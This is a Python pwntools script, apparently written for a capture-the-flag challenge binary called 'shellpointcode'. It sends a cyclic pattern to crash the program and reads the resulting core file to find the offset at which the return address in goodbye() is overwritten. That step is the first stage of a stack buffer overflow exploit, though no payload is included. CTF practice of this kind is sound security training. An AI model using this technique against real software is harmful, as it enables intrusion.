from pwn import *
import subprocess
import sys

def main():
    elf = ELF("/home/ctfplayer/ctf_files/shellpointcode")
    p = process("/home/ctfplayer/ctf_files/shellpointcode")
    p.recvuntil(b'What are your initials?\n')

    # Craft a cyclic pattern
    pattern = cyclic(100)
    p.sendline(pattern)

    try:
        p.wait()
    except:
        pass
    core = None
    if p.corefile:
        core = p.corefile
    else:
        # Try to find core file manually
        import glob
        files = glob.glob('core*')
        if files:
            core = files[0]
    if not core:
        print("[!] No corefile to analyze break in RIP/RET")
        sys.exit(1)

    # ELF is PIE so stack address in core will suffice
    offset = None
    try:
        corefile = Core(core)
        offset = cyclic_find(corefile.read(corefile.rsp, 8))
    except Exception as e:
        print(f"[!] Corefile analysis failed: {e}")
        sys.exit(1)
    if offset is not None:
        print(f"Offset to RIP overwrite in goodbye() is: {offset}")
    else:
        print("[!] Could not auto-detect offset.")

if __name__ == '__main__':
    main()

